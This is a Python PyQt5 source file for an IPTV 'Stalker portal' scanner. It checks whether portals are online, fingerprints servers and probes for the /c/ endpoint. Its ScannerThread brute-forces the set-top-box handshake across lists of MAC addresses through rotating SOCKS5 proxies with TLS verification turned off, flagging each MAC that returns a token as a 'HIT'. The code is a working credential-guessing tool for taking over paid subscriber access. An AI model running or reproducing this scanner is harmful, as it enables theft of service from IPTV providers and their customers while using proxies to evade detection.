import random
import requests
import urllib3
import concurrent.futures
from PyQt5.QtCore import QThread, pyqtSignal, QObject

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WorkerSignals(QObject):
    log = pyqtSignal(str)
    finished = pyqtSignal()
    hit = pyqtSignal(str, str) # url, mac

class PortalCheckerThread(QThread):
    def __init__(self, urls, user_agent, timeout):
        super().__init__()
        self.urls = urls
        self.user_agent = user_agent
        self.timeout = timeout
        self.signals = WorkerSignals()

    def run(self):
        self.signals.log.emit(f"Starting check for {len(self.urls)} portals...")
        online_portals = []
        for url in self.urls:
            try:
                full_url = url if url.startswith("http") else "http://" + url
                self.signals.log.emit(f"Checking {full_url}...")
                resp = requests.head(full_url, timeout=self.timeout, verify=False)
                if resp.status_code < 400:
                    self.signals.log.emit(f"✅ ONLINE: {full_url} (HTTP {resp.status_code})")
                    online_portals.append(full_url)
                else:
                    self.signals.log.emit(f"❌ OFFLINE: {full_url} (HTTP {resp.status_code})")
            except Exception as e:
                self.signals.log.emit(f"❌ OFFLINE/ERROR: {full_url} ({str(e)})")
        
        self.signals.finished.emit()

class PortalDetectiveThread(QThread):
    def __init__(self, url, user_agent, timeout):
        super().__init__()
        self.url = url if url.startswith("http") else "http://" + url
        self.user_agent = user_agent
        self.timeout = timeout
        self.signals = WorkerSignals()

    def run(self):
        self.signals.log.emit(f"Starting Detective on {self.url}...")
        try:
            headers = {"User-Agent": self.user_agent}
            resp = requests.get(self.url, headers=headers, timeout=self.timeout, verify=False)
            server = resp.headers.get("Server", "Unknown")
            self.signals.log.emit(f"🕵️ Detective -> {self.url} is running Server: {server}")
            
            if 'Location' in resp.headers:
                self.signals.log.emit(f"🕵️ Detective -> Redirects to: {resp.headers['Location']}")
            
            # Simple stalker check
            stalker_check = f"{self.url.rstrip('/')}/c/"
            resp_c = requests.get(stalker_check, headers=headers, timeout=self.timeout, verify=False)
            if resp_c.status_code == 200:
                self.signals.log.emit(f"✅ Stalker Portal detected at /c/")
            else:
                self.signals.log.emit(f"❌ No Stalker Portal at /c/")
                
        except Exception as e:
            self.signals.log.emit(f"🕵️ Detective -> Error analyzing {self.url}: {e}")
        
        self.signals.finished.emit()


class ScannerThread(QThread):
    def __init__(self, url, macs, proxies, user_agent, timeout, max_threads):
        super().__init__()
        self.url = url if url.endswith("/c/") else url.rstrip("/") + "/c/"
        self.macs = macs
        self.proxies = proxies
        self.user_agent = user_agent
        self.timeout = timeout
        self.max_threads = max_threads
        self.signals = WorkerSignals()
        self.is_scanning = True

    def run(self):
        self.signals.log.emit(f"🚀 Starting scan on {self.url} with {self.max_threads} threads...")
        
        def check_mac(mac):
            if not self.is_scanning: return
            proxy = random.choice(self.proxies) if self.proxies else None
            proxies_dict = {"http": f"socks5://{proxy}", "https": f"socks5://{proxy}"} if proxy else None
            
            headers = {
                "User-Agent": self.user_agent,
                "Authorization": f"Bearer {mac}",
                "Cookie": f"mac={mac}"
            }
            try:
                auth_url = f"{self.url}?type=stb&action=handshake&mac={mac}"
                resp = requests.get(auth_url, headers=headers, proxies=proxies_dict, timeout=self.timeout, verify=False)
                
                if resp.status_code == 200 and ('"token"' in resp.text or '"js_version"' in resp.text):
                    self.signals.log.emit(f"🎯 HIT! Valid MAC: {mac}")
                    self.signals.hit.emit(self.url, mac)
            except Exception:
                pass
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            for mac in self.macs:
                if not self.is_scanning: break
                executor.submit(check_mac, mac)
            
        self.signals.log.emit("✅ Scan finished!")
        self.signals.finished.emit()

    def stop(self):
        self.is_scanning = False
